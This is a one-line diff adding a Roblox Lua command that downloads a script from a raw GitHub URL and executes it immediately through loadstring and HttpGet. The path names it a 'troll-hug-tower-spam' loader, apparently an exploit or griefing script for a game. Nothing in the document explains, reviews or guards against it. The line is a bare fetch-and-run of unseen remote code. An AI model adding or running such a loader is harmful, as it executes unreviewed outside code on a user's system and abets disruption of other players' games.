@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/troll-hug-tower-spam4-rmp30rf4jr9ka5.lua"))()
